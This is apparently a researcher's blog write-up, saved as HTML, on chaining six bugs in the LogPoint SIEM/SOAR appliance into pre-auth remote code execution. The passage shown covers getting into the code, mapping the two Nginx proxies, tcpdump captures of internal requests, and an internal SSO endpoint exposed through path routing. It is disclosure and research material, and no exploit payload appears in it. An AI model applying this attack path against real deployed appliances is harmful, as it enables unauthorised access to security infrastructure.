<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>James Routley | Feed</title>
    <link
      rel="stylesheet"
      type="text/css"
      href="../styles.css"
      media="screen"
    />
  </head>
  <body>
    <a href="/index.html">Back</a>
    <a href="https://mehmetince.net/the-story-of-a-perfect-exploit-chain-six-bugs-that-looked-harmless-until-they-became-pre-auth-rce-in-a-security-appliance/">Original</a>
    <h1>Six Harmless Bugs Lead to Remote Code Execution</h1>
    
    <div id="readability-page-1" class="page"><article>
<p>It was May 2024, and our internal security team was evaluating the <mark>LogPoint SIEM/SOAR</mark> platform to replace our existing platform, potentially. As part of a habit Iâ€™ve built over the years â€”and honestly, part of our 3rd party due diligenceâ€” I gave myself 24 hours to do what I always do with any technology weâ€™re about to trust: try to break it.</p>



<p>Those 24 hours were enough to uncover <strong><mark>three serious vulnerabilities</mark></strong> almost immediately. Given their impact, I stopped there and proceeded directly to responsible disclosure.</p>



<p>Months later, with time finally on my side, I came back not to look for more bugs but to better understand the system. That second look revealed something far more interesting: how small, seemingly independent <mark>6 bugs</mark> could coalesce into a much larger problem. </p>



<p>This article tells that story. It follows a <s>hacker</s> humanâ€™s <mark>reasoning </mark>as it navigates unfamiliar code, undocumented behavior, and assumptions never meant to be tested. Along the way, it includes wrong turns and dead ends, but also the moments where something subtle feels off and careful inspection turns that feeling into a concrete finding.</p>



<p>I hope youâ€™ll enjoy the journey as much as I did. Happy New Year to everyone ðŸŽŠðŸ¥³</p>



<span id="more-924"></span>



<p><strong>TL;DR:</strong> This write-up walks through the exact process of building a <strong><mark>pre-auth RCE exploit chain</mark></strong> by chaining <mark>6 small bugs</mark>. I start by mapping the applianceâ€™s request flow (two Nginx layers and a split between host Python services and Docker-based Java microservices). From there, the chain forms step by step: exposed internal routes lead to auth primitives, a hard-coded signing secret enables forged access, leaked internal API credentials unlock higher privilege inside the microservice world, an SSRF pivot reaches host-only Python endpoints to mint an admin session, and finally, a rule-engine <code>eval()</code> sink becomes reachable by bypassing validation via a static AES encryption key in imported alert-rule packages. Each section shows the evidence, the reasoning, and how one weakness becomes the leverage for the next, until the final trigger executes code on the appliance.</p>



<h2>1. Accessing the main software code-base</h2>



<p>This was the part I expected to be boring. The research started the usual way, with an <code>.iso</code> image and a fresh VM in my local lab. Since the product was built on top of Ubuntu without additional hardening at the OS level, the standard <mark>Ubuntu recovery workflow</mark> was enough to regain root access and enable SSH, leaving me with a stable environment ready for analysis.</p>



<p>With access in place, I moved on to the code. The main web application was written in Python, built on a customized Flask framework, and lived under:</p>



<div data-code-block-pro-font-family="Code-Pro-JetBrains-Mono"><pre tabindex="0"><code><span><span>/</span><span>opt</span><span>/</span><span>makalu</span><span>/</span><span>installed</span><span>/</span><span>webserver</span><span>/</span></span></code></pre></div>



<p>This wasnâ€™t a fully transparent codebase, though. Like many production appliances, a large portion of the Python logic was shipped only as compiled <code>.pyc</code> files. To work comfortably, I copied the relevant directories to my local and reconstructed the missing sources by decompiling the orphaned bytecode with <code>uncompyle6</code>.</p>



<p>This is all fairly standard reverse-engineering work, so Iâ€™ll spare you the details.</p>



<div data-code-block-pro-font-family="Code-Pro-JetBrains-Mono"><pre tabindex="0"><code><span><span>#!/bin/bash</span></span>
<span></span>
<span><span># Function to traverse directories and check for .pyc files</span></span>
<span><span>check_pyc_files</span><span>() {</span></span>
<span><span> </span><span># Use find to locate all .pyc files</span></span>
<span><span> </span><span>find</span><span> </span><span>.</span><span> </span><span>-type</span><span> </span><span>f</span><span> </span><span>-name</span><span> </span><span>&#34;*.pyc&#34;</span><span> </span><span>|</span><span> </span><span>while</span><span> </span><span>read</span><span> </span><span>pyc_file</span><span>; </span><span>do</span></span>
<span><span>   </span><span># Remove the .pyc extension and replace with .py to find corresponding .py file</span></span>
<span><span>   py_file</span><span>=</span><span>&#34;${</span><span>pyc_file</span><span>%</span><span>.</span><span>pyc</span><span>}.py&#34;</span></span>
<span></span>
<span></span>
<span><span>   </span><span># Check if the corresponding .py file exists</span></span>
<span><span>   </span><span>if</span><span> [[ </span><span>!</span><span> </span><span>-f</span><span> </span><span>&#34;</span><span>$py_file</span><span>&#34;</span><span> ]]; </span><span>then</span></span>
<span><span>     </span><span># If not, print the .pyc filename</span></span>
<span><span>     </span><span>echo</span><span> </span><span>&#34;No matching .py file for: </span><span>$pyc_file</span><span>&#34;</span></span>
<span><span>     </span><span>uncompyle6</span><span> $pyc_file </span><span>&gt;</span><span> $py_file</span></span>
<span><span>   </span><span>fi</span></span>
<span><span> </span><span>done</span></span>
<span><span>}</span></span>
<span></span>
<span></span>
<span><span># Call the function to start checking from the current directory</span></span>
<span><span>check_pyc_files</span></span></code></pre></div>



<p>I thought this would be all I needed to quickly dive into manual source code analysis. But it became clear that <mark>LogPoint </mark>was far more complex than I had initially assumed. What I thought was a quick surface-level review turned into something much deeper, and I realized I had only scratched the surface.</p>



<h2>2. Where legacy meets containers! Understanding the <strong>Technical Architecture Overview</strong></h2>



<p>After spending a few hours with both the operating system and the codebase, the productâ€™s history began to reveal itself. Some design choices initially felt odd, but began to make sense once I understood the productâ€™s pivot over time.</p>



<p>LogPoint was clearly designed as a <strong><mark>SIEM-first</mark></strong> platform. The architecture reflects that era: core services like the Python backend, log normalizers, and database components run directly on the host operating system, a design long before Docker and modern container orchestration became the norm.</p>



<p>As the market shifted toward automated response, <mark>LogPoint</mark> needed to evolve. That evolution took the form of <mark>SOAR</mark>, a new capability that couldnâ€™t easily fit within the original architecture. Instead of rewriting everything, the newer SOAR components were introduced using Docker. The moment SOAR is enabled, containerized services spin up alongside the legacy host-based ones, marking a clear boundary between the productâ€™s past and its present.</p>



<blockquote>
<p>-&gt; <strong>SIEM</strong> is about visibilityâ€”collecting and correlating security events to tell you <em>what happened</em>.</p>
</blockquote>



<p>The diagram below reflects my high-level understanding of the technical architecture. The SOAR components run as Docker containers, configured with a bridged network interface, sitting alongside long-standing host-level services.</p>



<figure data-wp-context="{&#34;imageId&#34;:&#34;695b8511c8b96&#34;}" data-wp-interactive="core/image" data-wp-key="695b8511c8b96"><img decoding="async" width="1024" height="683" data-wp-class--hide="state.isContentHidden" data-wp-class--show="state.isContentVisible" data-wp-init="callbacks.setButtonStyles" data-wp-on--click="actions.showLightbox" data-wp-on--load="callbacks.setButtonStyles" data-wp-on-window--resize="callbacks.setButtonStyles" src="https://mehmetince.net/wp-content/uploads/2025/12/logpoint-design-overview-1024x683.jpg" alt="" srcset="https://mehmetince.net/wp-content/uploads/2025/12/logpoint-design-overview-1024x683.jpg 1024w, https://mehmetince.net/wp-content/uploads/2025/12/logpoint-design-overview-300x200.jpg 300w, https://mehmetince.net/wp-content/uploads/2025/12/logpoint-design-overview-768x512.jpg 768w, https://mehmetince.net/wp-content/uploads/2025/12/logpoint-design-overview.jpg 1536w" sizes="(max-width: 1024px) 100vw, 1024px"/><figcaption>Logpoint architecture</figcaption></figure>



<p>Itâ€™s almost impossible to migrate the existing services and core software to the Docker instance without a significant engineering investment. So they relaxed Docker network hardening and allowed all processes to communicate with each other.</p>



<p>One more detail is worth calling out. All of these SOAR microservices are implemented in <mark>Java </mark>and run inside the container network. This means the evolution was not just architectural but also technological, with a clear shift from the original <mark>Python-based</mark> stack to <mark>Java technologies</mark>. That change alone raises several questions about consistency, assumptions, and trust boundaries, which I will come back to later.</p>



<h3>2.1 Tracing External Attack Vectors</h3>



<p>The end goal is simple: <mark>pre-authenticated remote code execution</mark>. Over two decades of working with and breaking security products, I have learned that understanding the design is often the most effective way to build reliable attack vectors. Once the architecture is clear, the deeper you go down the rabbit hole, the fewer surprises you encounter and the easier it becomes to reason about where things might fail.</p>



<p>The following diagram is what Iâ€™ve understood during the research. Due to the default <code>iptables</code> Rules: We can only access <mark>ports 80 and 443</mark>, which are enabled by default.</p>



<figure data-wp-context="{&#34;imageId&#34;:&#34;695b8511c940a&#34;}" data-wp-interactive="core/image" data-wp-key="695b8511c940a"><img decoding="async" width="1024" height="513" data-wp-class--hide="state.isContentHidden" data-wp-class--show="state.isContentVisible" data-wp-init="callbacks.setButtonStyles" data-wp-on--click="actions.showLightbox" data-wp-on--load="callbacks.setButtonStyles" data-wp-on-window--resize="callbacks.setButtonStyles" src="https://mehmetince.net/wp-content/uploads/2025/12/logpoint-data-flow-networking-overview-e1766738750366-1024x513.jpg" alt="" srcset="https://mehmetince.net/wp-content/uploads/2025/12/logpoint-data-flow-networking-overview-e1766738750366-1024x513.jpg 1024w, https://mehmetince.net/wp-content/uploads/2025/12/logpoint-data-flow-networking-overview-e1766738750366-300x150.jpg 300w, https://mehmetince.net/wp-content/uploads/2025/12/logpoint-data-flow-networking-overview-e1766738750366-768x385.jpg 768w, https://mehmetince.net/wp-content/uploads/2025/12/logpoint-data-flow-networking-overview-e1766738750366.jpg 1440w" sizes="(max-width: 1024px) 100vw, 1024px"/></figure>



<p>This means there are two <code>Nginx</code> instances to focus on. To determine what is reachable from the outside <em>(ATTACKER HTTP Request in the diagram)</em>, I go straight to their configurations.</p>



<p>The first Nginx instance sits at the edge of the appliance and handles all incoming requests on port 443. The second runs inside the containerized environment and routes traffic to the SOAR microservices. Any external request must pass through the outer Nginx before reaching the container layer, making the boundary between the two especially interesting from a security perspective.</p>



<h3>2.2 A Tale of Two Nginx Instances</h3>



<p>Letâ€™s have a look at the <mark>first NGINX conf</mark>. You can find the configuration file at<strong> /opt/makalu/installed/webserver/deploy/nginx.conf</strong></p>



<div data-code-block-pro-font-family="Code-Pro-JetBrains-Mono"><pre tabindex="0"><code><span><span>location</span><span> </span><span>/soar/ </span><span>{</span></span>
<span><span>   </span><span> set </span><span>$session_cookie $http_cookie;</span></span>
<span><span>   </span><span> add_header </span><span>logpoint-cookie $session_cookie;</span></span>
<span><span>   </span><span> proxy_pass </span><span>https://localhost:9443/soar/;</span></span>
<span><span>}</span></span>
<span></span>
<span><span># ... OMITTED CONFIG ...</span></span>
<span></span>
<span><span>location</span><span> </span><span>/soar/sso/ </span><span>{</span></span>
<span><span>   </span><span> proxy_pass_request_headers </span><span>on;</span></span>
<span><span>   </span><span> proxy_pass </span><span>https://localhost:9443/sso/;</span></span>
<span><span>}</span></span>
<span></span>
<span><span>location</span><span> </span><span>/soar/elastic/ </span><span>{</span></span>
<span><span>    </span><span>#proxy_pass https://elastic:9200/$request_uri;</span></span>
<span><span>   </span><span> proxy_pass </span><span>https://localhost:9443/elastic/;</span></span>
<span><span>}</span></span>
<span></span>
<span><span>location</span><span> </span><span>~</span><span> </span><span>^/soar/(backend|data|reports-service|multi-tenant) </span><span>{</span></span>
<span><span>    </span><span>rewrite</span><span> </span><span>^/soar/(.*)$</span><span> /$1 </span><span>break</span><span>;</span></span>
<span><span>   </span><span> proxy_pass </span><span>https://localhost:9443/$1;</span></span>
<span><span>}</span></span>
<span></span>
<span><span>location</span><span> </span><span>/soar/api/ </span><span>{</span></span>
<span><span>   </span><span> proxy_pass_request_headers </span><span>on;</span></span>
<span><span>   </span><span> proxy_send_timeout </span><span>600;</span></span>
<span><span>   </span><span> proxy_read_timeout </span><span>600;</span></span>
<span><span>   </span><span> send_timeout </span><span>600;</span></span>
<span><span>   </span><span> proxy_pass </span><span>https://localhost:9443/api/;</span></span>
<span><span>}</span></span></code></pre></div>



<p>At a glance, it acts primarily as a reverse proxy, forwarding selected URL paths to an internal service listening on <code>localhost:9443</code>. Most SOAR related endpoints, along with static assets and runtime resources, are passed through with minimal transformation.</p>



<div data-code-block-pro-font-family="Code-Pro-JetBrains-Mono"><pre tabindex="0"><code><span><span>root@logpoint:~#</span><span> </span><span>docker</span><span> </span><span>ps</span><span> </span><span>|</span><span>grep</span><span> </span><span>front</span></span>
<span><span>9345cf9e5e7d</span><span>   </span><span>secbi/frontend-v3:v2.1.0</span><span>   </span><span>&#34;/docker-entrypointâ€¦&#34;</span><span>   </span><span>2</span><span> </span><span>weeks</span><span> </span><span>ago</span><span>   </span><span>Up</span><span> </span><span>42</span><span> </span><span>minutes</span><span>   </span><span>soar-frontend</span></span>
<span></span>
<span><span>root@logpoint:~#</span><span> </span><span>docker</span><span> </span><span>exec</span><span> </span><span>-it</span><span> </span><span>9345</span><span>cf9e5e7d</span><span> </span><span>bash</span></span>
<span><span>bash-5.1#</span><span> </span><span>cat</span><span> </span><span>/etc/nginx/nginx.conf</span><span> </span><span>|</span><span>grep</span><span> </span><span>9443</span></span>
<span><span>    </span><span>listen</span><span> </span><span>9443</span><span> </span><span>ssl</span><span> </span><span>http2</span><span>;</span></span>
<span><span>    </span><span>listen</span><span> [::]:9443 ssl http2;</span></span>
<span><span>bash-5.1#</span><span> </span><span>cat</span><span> </span><span>/etc/nginx/nginx.conf</span><span> </span><span>|</span><span>grep</span><span> </span><span>&#39;proxy_pass\|location&#39;</span></span></code></pre></div>



<p>Simply listing the Docker and accessing the <code>secbi/frontend</code> instance helps me to verify that the requests are sent to the second Nginx, which listens <code>localhost:9443</code></p>



<p><span>Now, l</span>etâ€™s have a look at theÂ secondÂ NGINX conf. Due to the length of the conf file, I just grepped the most important lines. That will give you the general idea of whatâ€™s going on.</p>



<div data-code-block-pro-font-family="Code-Pro-JetBrains-Mono"><pre tabindex="0"><code><span><span>location</span><span> </span><span>/ </span><span>{</span></span>
<span></span>
<span><span>    ... </span><span>OMITTED</span><span> CONFIG ...</span></span>
<span></span>
<span><span>    </span><span>location</span><span> </span><span>/soar/ </span><span>{</span></span>
<span><span>    }</span></span>
<span></span>
<span><span>    </span><span>location</span><span> </span><span>/soar/images </span><span>{</span></span>
<span><span>    }</span></span>
<span></span>
<span><span>    </span><span>location</span><span> </span><span>/soar/login/ </span><span>{</span></span>
<span><span>    }</span></span>
<span></span>
<span><span>    </span><span>location</span><span> </span><span>/login </span><span>{</span></span>
<span><span>    }</span></span>
<span></span>
<span><span>    </span><span>location</span><span> </span><span>/soar/mssp </span><span>{</span></span>
<span><span>    }</span></span>
<span></span>
<span><span>    </span><span>location</span><span> </span><span>/mssp </span><span>{</span></span>
<span><span>       </span><span> proxy_pass </span><span>http://soar-mssp-service:9070;</span></span>
<span><span>    }</span></span>
<span></span>
<span><span>    </span><span>location</span><span> </span><span>/soar/schedule </span><span>{</span></span>
<span><span>    }</span></span>
<span></span>
<span><span>    </span><span>location</span><span> </span><span>/schedule </span><span>{</span></span>
<span><span>       </span><span> proxy_pass </span><span>http://secbi-scheduler-service:9861;</span></span>
<span><span>    }</span></span>
<span></span>
<span><span>    </span><span>location</span><span> </span><span>/soar/notifications </span><span>{</span></span>
<span><span>    }</span></span>
<span></span>
<span><span>    </span><span>location</span><span> </span><span>/notifications </span><span>{</span></span>
<span><span>       </span><span> proxy_pass </span><span>http://soar-notifications-service:8111;</span></span>
<span><span>    }</span></span>
<span></span>
<span><span>    </span><span>location</span><span> </span><span>/api </span><span>{</span></span>
<span><span>       </span><span> proxy_pass </span><span>http://secbi-api-service:8787;</span></span>
<span><span>    }</span></span>
<span></span>
<span><span>    </span><span>location</span><span> </span><span>/data </span><span>{</span></span>
<span><span>       </span><span> proxy_pass </span><span>http://secbi-data-service:9987;</span></span>
<span><span>    }</span></span>
<span></span>
<span><span>    </span><span>location</span><span> </span><span>/backend </span><span>{</span></span>
<span><span>       </span><span> proxy_pass </span><span>http://secbi-backend-service:9088;</span></span>
<span><span>    }</span></span>
<span></span>
<span><span>    </span><span>location</span><span> </span><span>/elastic </span><span>{</span></span>
<span><span>       </span><span> proxy_pass </span><span>http://elastic:9200/;</span></span>
<span><span>    }</span></span>
<span></span>
<span><span>    </span><span>location</span><span> </span><span>/sso </span><span>{</span></span>
<span><span>       </span><span> proxy_pass </span><span>http://secbi-login-service:8072;</span></span>
<span><span>    }</span></span>
<span><span>}</span></span></code></pre></div>



<p>Unlike the outer proxy, this one acts as a traffic dispatcher between multiple SOAR microservices. Each path is mapped directly to a specific backend <code>service</code>, <code>scheduler</code>, <code>notification engine</code>, <code>API layer</code>, or even <code>Elasticsearch</code> itself.</p>



<p>What stands out here is how permissive the Nginx path configuration is. Broad routing rules make it trivial to reach internal services via URL paths alone. At this point, Nginx is no longer enforcing a security boundary; it simply routes traffic, and a matching path is often all it takes for a request to be trusted and forwarded.</p>



<h2>Bug 1 â€“ Nginx Path Routing Misconfiguration</h2>



<p>Typically, this design is risky but not dangerous. It assumes that every single endpoint behind it enforces authentication and authorization correctly. This approach often works well when a central session mechanism is a <code>JWT</code>. The user presents the token; the proxy forwards it, and each service validates identity and permissions independently. <em>( API Gateway is a much better way to do this btw )</em></p>



<p>But this is where the attacker mindset kicks in. A routing layer like this dramatically expands the attack surface. I am no longer looking at a single application. I am looking at a collection of internal services, each with its own endpoints, assumptions, and edge cases. And all I need is one mistake in one place to start pulling on the thread. </p>



<p>That realization brings me back to a question I have been circling since the beginning of this research. How do a legacy Python backend and a set of modern Java microservices actually work together!?</p>



<blockquote>
<p><strong><mark>How the authentication on the Python-backend side is shared/validated on the SOAR world (docker services) ?</mark></strong></p>
</blockquote>



<p>The most essential task is to answer these questions. So I started running straightforward tests. First, I know these containers can communicate with each other over HTTP. Itâ€™s internal communication anyway. And I also know that Docker is in bridge mode, which gives me a quite easy way to gain more visibility between the Docker-to-Docker communications</p>



<div data-code-block-pro-font-family="Code-Pro-JetBrains-Mono"><pre tabindex="0"><code><span><span>root@logpoint:~#</span><span> </span><span>tcpdump</span><span> </span><span>-i</span><span> </span><span>lo</span><span> </span><span>-vvv</span><span> </span><span>-s</span><span> </span><span>0</span><span> </span><span>-A</span><span> </span><span>&#39;tcp[((tcp[12:] &amp; 0xf0) &gt;&gt; 2):4] = 0x47455420 or tcp[((tcp[12:] &amp; 0xf0) &gt;&gt; 2):4] = 0x504f5354&#39;</span></span>
<span></span>
<span><span>tcpdump:</span><span> </span><span>listening</span><span> </span><span>on</span><span> </span><span>lo,</span><span> </span><span>link-type</span><span> </span><span>EN10MB</span><span> (Ethernet), capture size 262144 bytes</span></span>
<span></span>
<span><span>08:58:40.776227</span><span> </span><span>IP</span><span> (tos </span><span>0x0</span><span>,</span><span> </span><span>ttl</span><span> </span><span>64</span><span>,</span><span> </span><span>id</span><span> </span><span>52811</span><span>,</span><span> </span><span>offset</span><span> </span><span>0</span><span>,</span><span> </span><span>flags</span><span> [DF], proto TCP (</span><span>6</span><span>), length 210)</span></span>
<span><span>    </span><span>localhost.37562</span><span> </span><span>&gt;</span><span> </span><span>localhost.8072:</span><span> </span><span>Flags</span><span> [P.], cksum 0xfec6 (</span><span>incorrect</span><span> -</span><span>&gt;</span><span> </span><span>0xcda9</span><span>), seq 1525306448:1525306618, ack 1891361062, win 22, length 170</span></span>
<span><span>E..k.@.@..2.TPp8....</span></span>
<span><span>....</span><span>.GET </span><span>/sso/v1/health</span><span> </span><span>HTTP/1.1</span></span>
<span><span>Host:</span><span> </span><span>soar-login-service:8072</span></span>
<span><span>User-Agent:</span><span> </span><span>Consul</span><span> </span><span>Health</span><span> </span><span>Check</span></span>
<span><span>Accept:</span><span> </span><span>text/plain,</span><span> </span><span>text/</span><span>*</span><span>,</span><span> </span><span>*</span><span>/</span><span>*</span></span>
<span><span>Accept-Encoding:</span><span> </span><span>gzip</span></span>
<span><span>Connection:</span><span> </span><span>close</span></span>
<span></span>
<span><span>^C</span></span>
<span><span>3</span><span> </span><span>packets</span><span> </span><span>captured</span></span>
<span><span>6</span><span> </span><span>packets</span><span> </span><span>received</span><span> </span><span>by</span><span> </span><span>filter</span></span>
<span><span>0</span><span> </span><span>packets</span><span> </span><span>dropped</span><span> </span><span>by</span><span> </span><span>kernel</span></span></code></pre></div>



<p>A simple <code>tcpdump</code> running on the hostâ€™s local interface is enough to show every internal HTTP request as it happens. Almost immediately, the terminal begins to flood with traffic.</p>



<p>I logged into the product with the administrator users, I  go to the Settings &gt; SOAR settings <a href="https://192.168.179.136/soar/settings#/"><code>https://192.168.179.136/soar/settings#/</code></a>. I looked at my Burp Suite logs and saw tons of requests. When I glanced back at the terminal running tcpdump, all hell broke loose. The volume of internal traffic is far higher than the UI interaction alone would suggest.</p>



<p>I started reading my Burp Suite logs, and Iâ€™ve cherry-picked the <a href="https://192.168.179.136/soar/api/v1/session/username"><code>https://192.168.179.136/soar/api/v1/session/username</code></a> request. After resetting my terminal and clearing all output, I sent the request to the Repeater using <strong>CTRL + R</strong> and triggered it once by clicking the <strong>Repeat</strong> button.</p>



<p>When you repeat that request, you can see instantly 2 different HTTP requests appear in <code>tcpdump</code> output.</p>



<div data-code-block-pro-font-family="Code-Pro-JetBrains-Mono"><pre tabindex="0"><code><span><span>root</span><span>@</span><span>logpoint:</span><span>~</span><span> tcpdump </span><span>-</span><span>i lo </span><span>-</span><span>vvv </span><span>-</span><span>s </span><span>0</span><span> </span><span>-</span><span>A </span><span>&#39;tcp[((tcp[12:] &amp; 0xf0) &gt;&gt; 2):4] = 0x47455420 or tcp[((tcp[12:] &amp; 0xf0) &gt;&gt; 2):4] = 0x504f5354&#39;</span></span>
<span></span>
<span><span>tcpdump: listening on lo, link</span><span>-</span><span>type</span><span> EN10MB (Ethernet), capture size </span><span>162144</span><span> </span><span>bytes</span></span>
<span><span>E</span><span>...</span><span>o</span><span>@</span><span>.</span><span>@</span><span>......</span><span>.d</span><span>&#39;S,.A.8#..P......GET /api/v1/session/username HTTP/1.0</span></span>
<span><span>Host: localhost:</span><span>9443</span></span>
<span><span>X</span><span>-</span><span>Real</span><span>-</span><span>IP</span><span>: </span><span>127.0</span><span>.0.1</span></span>
<span><span>X</span><span>-</span><span>Forwarded</span><span>-</span><span>For: </span><span>127.0</span><span>.0.1</span></span>
<span><span>X</span><span>-</span><span>Forwarded</span><span>-</span><span>Proto: https</span></span>
<span><span>Connection: close</span></span>
<span><span>sec</span><span>-</span><span>ch</span><span>-</span><span>ua: </span><span>&#34;Chromium&#34;</span><span>;v</span><span>=</span><span>&#34;125&#34;</span><span>, </span><span>&#34;Not.A/Brand&#34;</span><span>;v</span><span>=</span><span>&#34;24&#34;</span></span>
<span><span>accept: application</span><span>/</span><span>json</span></span>
<span><span>sec</span><span>-</span><span>ch</span><span>-</span><span>ua</span><span>-</span><span>mobile: </span><span>?</span><span>0</span></span>
<span><span>user</span><span>-</span><span>agent: Mozilla</span><span>/</span><span>5.0</span><span> (Windows </span><span>NT</span><span> </span><span>10.0</span><span>; Win64; x64) AppleWebKit</span><span>/</span><span>537.36</span><span> (</span><span>KHTML</span><span>, like Gecko) Chrome</span><span>/</span><span>125.0</span><span>.6422.112 Safari</span><span>/</span><span>537.36</span></span>
<span><span>sec</span><span>-</span><span>ch</span><span>-</span><span>ua</span><span>-</span><span>platform: </span><span>&#34;Windows&#34;</span></span>
<span><span>sec</span><span>-</span><span>fetch</span><span>-</span><span>site: same</span><span>-</span><span>origin</span></span>
<span><span>sec</span><span>-</span><span>fetch</span><span>-</span><span>mode: cors</span></span>
<span><span>sec</span><span>-</span><span>fetch</span><span>-</span><span>dest: empty</span></span>
<span><span>referer: https:</span><span>//</span><span>192.168</span><span>.179.136</span><span>/</span><span>soar</span><span>/</span><span>settings</span></span>
<span><span>accept</span><span>-</span><span>encoding: gzip, deflate, br</span></span>
<span><span>accept</span><span>-</span><span>language: en</span><span>-</span><span>US</span><span>,en;q</span><span>=</span><span>0.9</span></span>
<span><span>priority: u</span><span>=</span><span>1</span><span>, i</span></span>
<span><span>cookie: ldap_login_domain</span><span>=</span><span>; settings</span><span>-</span><span>category</span><span>=</span><span>system; settings</span><span>-</span><span>history</span><span>=%</span><span>7B</span><span>%</span><span>22admin</span><span>%</span><span>22</span><span>%</span><span>3A</span><span>%</span><span>5B</span><span>%</span><span>7B</span><span>%</span><span>22name</span><span>%</span><span>22</span><span>%</span><span>3A</span><span>%</span><span>22Manage</span><span>%</span><span>20Deactivated</span><span>%</span><span>20Users</span><span>%</span><span>22</span><span>%</span><span>2C</span><span>%</span><span>22url</span><span>%</span><span>22</span><span>%</span><span>3A</span><span>%</span><span>22Users</span><span>%</span><span>2FManage</span><span>%</span><span>22</span><span>%</span><span>7D</span><span>%</span><span>2C</span><span>%</span><span>7B</span><span>%</span><span>22name</span><span>%</span><span>22</span><span>%</span><span>3A</span><span>%</span><span>22System</span><span>%</span><span>20Settings</span><span>%</span><span>22</span><span>%</span><span>2C</span><span>%</span><span>22url</span><span>%</span><span>22</span><span>%</span><span>3A</span><span>%</span><span>22System</span><span>%</span><span>22</span><span>%</span><span>7D</span><span>%</span><span>5D</span><span>%</span><span>7D;</span></span>
<span><span>session</span><span>=</span><span>96ba21e449fc4a28_66714edb</span><span>.VBehj2LxPrac_AFhtZZarjLdDqk; activeNavMenu</span><span>=/</span><span>soar</span><span>/</span><span>settings</span></span>
<span></span>
<span><span>0</span><span>9</span><span>:</span><span>12</span><span>:</span><span>02.697196</span><span> IP (tos </span><span>0x</span><span>0</span><span>, ttl </span><span>64</span><span>, </span><span>id</span><span> </span><span>59246</span><span>, offset </span><span>0</span><span>, flags [</span><span>DF</span><span>], proto TCP (</span><span>6</span><span>), length </span><span>359</span><span>)</span></span>
<span><span>    localhost.59452 </span><span>&gt;</span><span> localhost.8072: Flags [P.], cksum </span><span>0x</span><span>ff5b</span><span> (incorrect </span><span>-&gt;</span><span> </span><span>0x</span><span>1023</span><span>), seq </span><span>3606162607</span><span>:</span><span>3606162926</span><span>, ack </span><span>3263890617</span><span>, win </span><span>22</span><span>, length </span><span>319</span></span>
<span><span>E..g.n.</span><span>@</span><span>.</span><span>@</span><span>......</span><span>.</span></span>
<span><span>......POST</span><span> </span><span>/</span><span>sso</span><span>/</span><span>v1</span><span>/</span><span>logpoint</span><span>/</span><span>validate</span><span>-</span><span>cookie </span><span>HTTP</span><span>/</span><span>1.1</span></span>
<span><span>Content</span><span>-</span><span>Type: application</span><span>/</span><span>json</span></span>
<span><span>Accept: application</span><span>/</span><span>json</span></span>
<span><span>Content</span><span>-</span><span>Length: </span><span>81</span></span>
<span><span>Host: secbi</span><span>-</span><span>login</span><span>-</span><span>service:</span><span>8072</span></span>
<span><span>Connection: Keep</span><span>-</span><span>Alive</span></span>
<span><span>User</span><span>-</span><span>Agent: Apache</span><span>-</span><span>HttpClient</span><span>/</span><span>4.5</span><span>.14 (Java</span><span>/</span><span>17.0</span><span>.8.1)</span></span>
<span></span>
<span><span>{</span><span>&#34;key&#34;</span><span>:</span><span>&#34;session&#34;</span><span>,</span><span>&#34;value&#34;</span><span>:</span><span>&#34;96ba21e449fc4a28_66714edb.VBehj2LxPrac_AFhtZZarjLdDqk&#34;</span><span>}</span></span>
<span></span>
<span><span>0</span><span>9</span><span>:</span><span>12</span><span>:</span><span>03.787639</span><span> IP (tos </span><span>0x</span><span>0</span><span>, ttl </span><span>64</span><span>, </span><span>id</span><span> </span><span>27504</span><span>, offset </span><span>0</span><span>, flags [</span><span>DF</span><span>], proto TCP (</span><span>6</span><span>), length </span><span>219</span><span>)</span></span>
<span></span></code></pre></div>



<p>These two requests answer my question. The first request, <code>GET /api/v1/session/username</code>, is the one I trigger directly. The second request, <code>POST /sso/v1/logpoint/validate-cookie</code>, is generated behind the scenes by the microservices themselves! Let me explain what happened.</p>



<p>1 â€“ From the outside world, I sent a request to the <code>/soar/api/v1/session/username</code>. Due to the following <mark>1st NGINX</mark> rules, itâ€™s sent to the <code>https://localhost:9443/api/</code></p>



<div data-code-block-pro-font-family="Code-Pro-JetBrains-Mono"><pre tabindex="0"><code><span><span>location</span><span> </span><span>/soar/api/ </span><span>{</span></span>
<span><span>   </span><span> proxy_pass_request_headers </span><span>on;</span></span>
<span><span>   </span><span> proxy_send_timeout </span><span>600;</span></span>
<span><span>   </span><span> proxy_read_timeout </span><span>600;</span></span>
<span><span>   </span><span> send_timeout </span><span>600;</span></span>
<span><span>   </span><span> proxy_pass </span><span>https://localhost:9443/api/;</span></span>
<span><span>}</span></span></code></pre></div>



<p>2 â€“ Following the <mark>2nd NGINX</mark> rule, it kicked in and forwarded it to the <code>api-service</code> container</p>



<div data-code-block-pro-font-family="Code-Pro-JetBrains-Mono"><pre tabindex="0"><code><span><span>location</span><span> </span><span>/api </span><span>{</span></span>
<span><span>   </span><span> proxy_pass </span><span>http://secbi-api-service:8787;</span></span>
<span><span>}</span></span></code></pre></div>



<p>3 â€“ Api Services take the session cookie from the request and send a brand new HTTP POST call to the POST <code>/sso/v1/logpoint/validate-cookie</code> endpoint with a body to validate the session!</p>



<p>4 â€“ This endpoint is also from the <code>api-service</code> container. Somehow, this function validates our session. But, seriouslyâ€¦ how does it do it? </p>



<p>But before following the white rabbit and decompiling Java microservices, I pause and focus on the bug itself. The <code>/sso/v1/logpoint/validate-cookie</code> endpoint stands out immediately. This endpoint is clearly not meant to be publicly accessible. And yet, from an attackerâ€™s point of view, I can reach it directly just by adding the <code>/soar/</code> prefix to the path.</p>



<p>That moment is hard to ignore. No authentication trickery, no bypass logic yet. Just a simple path rewrite, quietly turning an internal endpoint into something exposed to the outside world.</p>



